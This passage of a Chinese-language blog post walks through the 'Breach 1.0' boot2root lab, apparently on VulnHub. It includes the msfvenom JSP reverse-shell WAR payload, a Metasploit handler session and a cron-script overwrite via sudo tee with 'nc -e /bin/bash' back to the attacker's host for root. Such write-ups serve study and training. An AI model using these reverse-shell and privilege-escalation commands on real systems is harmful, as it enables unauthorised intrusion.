port</span><br><span class="line">   SHELL                   no        The system shell to use.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.110.128</span><br><span class="line">lhost =&gt; 192.168.110.128</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (java/jsp_shell_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.110.128  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line">   SHELL                   no        The system shell to use.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.110.128:4444 </span><br><span class="line">[*] Command shell session 1 opened (192.168.110.128:4444 -&gt; 192.168.110.140:36310) at 2019-07-01 00:19:08 +0800</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=104(tomcat6) gid=112(tomcat6) groups=112(tomcat6)</span><br></pre></td></tr></table></figure>
+
+<p>查看当前系统用户，找id为1000以后的用户<code>cat /etc/passwd</code><br>我们发现有两个值得关注用户分别是<code>milton</code>和<code>blumbergh</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[*] Command shell session 2 opened (192.168.110.128:4444 -&gt; 192.168.110.140:36312) at 2019-07-01 00:30:32 +0800</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=104(tomcat6) gid=112(tomcat6) groups=112(tomcat6)</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:</span><br><span class="line">syslog:x:101:104::/home/syslog:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:102:106::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">landscape:x:103:109::/var/lib/landscape:/bin/<span class="literal">false</span></span><br><span class="line">milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash</span><br><span class="line">tomcat6:x:104:112::/usr/share/tomcat6:/bin/<span class="literal">false</span></span><br><span class="line">colord:x:105:114:colord colour management daemon,,,:/var/lib/colord:/bin/<span class="literal">false</span></span><br><span class="line">mysql:x:106:116:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<h4 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h4><p>从之前的笔记我们有记录，我们在<code>bill.png</code>中发现一个字符串<code>coffeestains</code>很像一个密码啦，现在我得到了比尔的帐户名称<code>blumbergh</code><br>现在<code>su</code>给<code>blumbergh</code>的密码<code>coffeestains</code></p>
+<p>注意：这里直接用su是不行的，因为无法执行su命令，显示需要一个终端，遇到这个问题，通过Python解决：<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid=104(tomcat6) gid=112(tomcat6) groups=112(tomcat6)</span><br><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br><span class="line">tomcat6@Breach:/home$ su blumbergh</span><br><span class="line">su blumbergh</span><br><span class="line">Password: coffeestains</span><br><span class="line"></span><br><span class="line">blumbergh@Breach:/home$ id</span><br><span class="line">id</span><br><span class="line">uid=1001(blumbergh) gid=1001(blumbergh) groups=1001(blumbergh)</span><br><span class="line">blumbergh@Breach:/home$</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">blumbergh@Breach:/home$ <span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">blumbergh@Breach:~$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 3 blumbergh blumbergh 4096 Jun 12  2016 .</span><br><span class="line">drwxr-xr-x 4 root      root      4096 Jun  4  2016 ..</span><br><span class="line">-rw------- 1 blumbergh blumbergh   61 Jun 12  2016 .bash_history</span><br><span class="line">-rw-r--r-- 1 blumbergh blumbergh  220 Jun  4  2016 .bash_logout</span><br><span class="line">-rw-r--r-- 1 blumbergh blumbergh 3637 Jun  4  2016 .bashrc</span><br><span class="line">drwx------ 2 blumbergh blumbergh 4096 Jun  6  2016 .cache</span><br><span class="line">-rw-r--r-- 1 blumbergh blumbergh  675 Jun  4  2016 .profile</span><br><span class="line">blumbergh@Breach:~$ cat .bash_history</span><br><span class="line">cat .bash_history</span><br><span class="line">clear</span><br><span class="line">logoff</span><br><span class="line"><span class="built_in">logout</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/cleanup</span><br><span class="line">cat tidyup.sh</span><br><span class="line">blumbergh@Breach:~$ locate tidyup.sh</span><br><span class="line">locate tidyup.sh</span><br><span class="line">/usr/share/cleanup/tidyup.sh</span><br><span class="line">blumbergh@Breach:~$ ls -al /usr/share/cleanup/tidyup.sh</span><br><span class="line">ls -al /usr/share/cleanup/tidyup.sh</span><br><span class="line">-rwxr-xr-x 1 root root 289 Jun 12  2016 /usr/share/cleanup/tidyup.sh</span><br><span class="line">blumbergh@Breach:~$ cat /usr/share/cleanup/tidyup.sh</span><br><span class="line">cat /usr/share/cleanup/tidyup.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Hacker Evasion Script </span></span><br><span class="line"><span class="comment">#Initech Cyber Consulting, LLC</span></span><br><span class="line"><span class="comment">#Peter Gibbons and Michael Bolton - 2016</span></span><br><span class="line"><span class="comment">#This script is set to run every 3 minutes as an additional defense measure against hackers.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /var/lib/tomcat6/webapps &amp;&amp; find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf</span><br><span class="line">blumbergh@Breach:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> blumbergh on Breach:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User blumbergh may run the following commands on Breach:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh</span><br><span class="line">blumbergh@Breach:~$</span><br></pre></td></tr></table></figure>
+
+<h4 id="反弹ROOT，获取FLAG"><a href="#反弹ROOT，获取FLAG" class="headerlink" title="反弹ROOT，获取FLAG"></a>反弹ROOT，获取FLAG</h4><p>这里我们知道<code>tidyup.sh</code>脚本将每3分钟自动运行一次，并<code>blumbergh</code>获得ROOT权限以运行命令<code>/usr/bin/tee /usr/share/cleanup/tidyup.sh</code>该命令将能够将<code>tidyup.sh</code>脚本修改为恶意shell。</p>
+<p>设置nc为侦听本地端口<code>7777</code>后，我运行以下命令来修改<code>tidyup.sh</code>脚本以包含恶意代码：<br><code>echo &quot;nc -e /bin/bash 192.168.110.128 7777&quot; | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">blumbergh@Breach:~$ <span class="built_in">echo</span> <span class="string">"nc -e /bin/bash 192.168.110.128 7777"</span> | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</span><br><span class="line">tee /usr/share/cleanup/tidyup.sh0.128 7777<span class="string">" | sudo /usr/bin/ </span></span><br><span class="line"><span class="string">nc -e /bin/bash 192.168.110.128 7777</span></span><br><span class="line"><span class="string">blumbergh@Breach:~$</span></span><br></pre></td></tr></table></figure>
+
+<p>监听<code>7777</code>端口<br><code>nc -lvnp 7777</code><br>稍等片刻就可以看到得到ROOT用户！然后用<code>ls -la</code>看看都有些什么东西，很明显看到了<code>flag</code>的标识，我们最终的目的就是它<code>cat .flag.txt</code>ojbk游戏通关！<br><img src="/2019/06/26/Breach-1-0/27.png" alt="27"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvnp 7777</span></span><br><span class="line">listening on [any] 7777 ...</span><br><span class="line">connect to [192.168.110.128] from (UNKNOWN) [192.168.110.140] 51528</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/root</span><br><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br><span class="line">root@Breach:~<span class="comment"># ls -la</span></span><br><span class="line">ls -la</span><br><span class="line">total 60</span><br><span class="line">drwx------  4 root root  4096 Jun 12  2016 .</span><br><span class="line">drwxr-xr-x 22 root root  4096 Jun  4  2016 ..</span><br><span class="line">-rw-------  1 root root   115 Jun 12  2016 .bash_history</span><br><span class="line">-rw-r--r--  1 root root  3106 Feb 19  2014 .bashrc</span><br><span class="line">drwx------  2 root root  4096 Jun  6  2016 .cache</span><br><span class="line">-rw-r--r--  1 root root   840 Jun 11  2016 .flag.txt</span><br><span class="line">-rw-r--r--  1 root root 23792 Jun  4  2016 flair.jpg</span><br><span class="line">-rw-r--r--  1 root root   140 Feb 19  2014 .profile</span><br><span class="line">drwxr-xr-x  2 root root  4096 Jun  5  2016 .rpmdb</span><br><span class="line">-rw-r--r--  1 root root    66 Jun  4  2016 .selected_editor</span><br><span class="line">root@Breach:~<span class="comment"># cat .flag.txt</span></span><br><span class="line">cat .flag.txt</span><br><span class="line">-----------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">______                     _     __   _____      _____ _          _____          _ </span><br><span class="line">| ___ \                   | |   /  | |  _  |    |_   _| |        |  ___|        | |</span><br><span class="line">| |_/ /_ __ ___  __ _  ___| |__ `| | | |/<span class="string">' |______| | | |__   ___| |__ _ __   __| |</span></span><br><span class="line"><span class="string">| ___ \ '</span>__/ _ \/ _` |/ __| <span class="string">'_ \ | | |  /| |______| | | '</span>_ \ / _ \  __| <span class="string">'_ \ / _` |</span></span><br><span class="line"><span class="string">| |_/ / | |  __/ (_| | (__| | | || |_\ |_/ /      | | | | | |  __/ |__| | | | (_| |</span></span><br><span class="line"><span class="string">\____/|_|  \___|\__,_|\___|_| |_\___(_)___/       \_/ |_| |_|\___\____/_| |_|\__,_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-----------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">Congrats on reaching the end and thanks for trying out my first #vulnhub boot2root!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Shout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting.</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="汇总："><a href="#汇总：" class="headerlink" title="汇总："></a>汇总：</h4><p>1.<code>keystore</code>是存储公私密码的一种文件格式</p>
+<p>2.<code>keytool</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment">##查看keystore这个密钥库里面的所有证书</span></span><br><span class="line">root@kali:~<span class="comment"># keytool -list -v -keystore keystore</span></span><br><span class="line">root@kali:~<span class="comment">##从密钥库导出.p12证书</span></span><br><span class="line">root@kali:~<span class="comment"># keytool -v -importkeystore -srckeystore keystore -srcalias tomcat -destkeystore myp12file.p12 -deststoretype PKCS12</span></span><br></pre></td></tr></table></figure>
+
+<p>3.火狐访问<code>tls</code></p>
+<p>进入<code>about:config</code>并添加字符串<code>security.tls.insecure_fallback_hosts 192.168.110.140</code><br>代理所有协议访问<code>8080</code></p>
+<p>4.生成木马</p>
+<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.128 LPORT=4444 -f war &gt; shell.war</code></p>
+<p>5.python解决无法su</p>
+<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p>6.用<code>tee</code>进行提权</p>
+<p><code>echo &quot;nc -e /bin/bash 192.168.110.128 7777&quot; | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</code></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/24/sqlmap-tamper详解/" rel="next" title="sqlmap tamper详解">
+                <i class="fa fa-chevron-left"></i> sqlmap tamper详解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/28/记一次捕获野生0day/" rel="prev" title="记一次捕获野生0day">
+                记一次捕获野生0day <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Guko</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Breach靶场"><span class="nav-number">1.</span> <span class="nav-text">Breach靶场</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#工具"><span class="nav-number">2.</span> <span class="nav-text">工具</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#信息收集"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞挖掘"><span class="nav-number">4.</span> <span class="nav-text">漏洞挖掘</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取shell"><span class="nav-number">5.</span> <span class="nav-text">获取shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#提升权限"><span class="nav-number">6.</span> <span class="nav-text">提升权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反弹ROOT，获取FLAG"><span class="nav-number">7.</span> <span class="nav-text">反弹ROOT，获取FLAG</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#汇总："><span class="nav-number">8.</span> <span class="nav-text">汇总：</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Guko</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">15.1k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
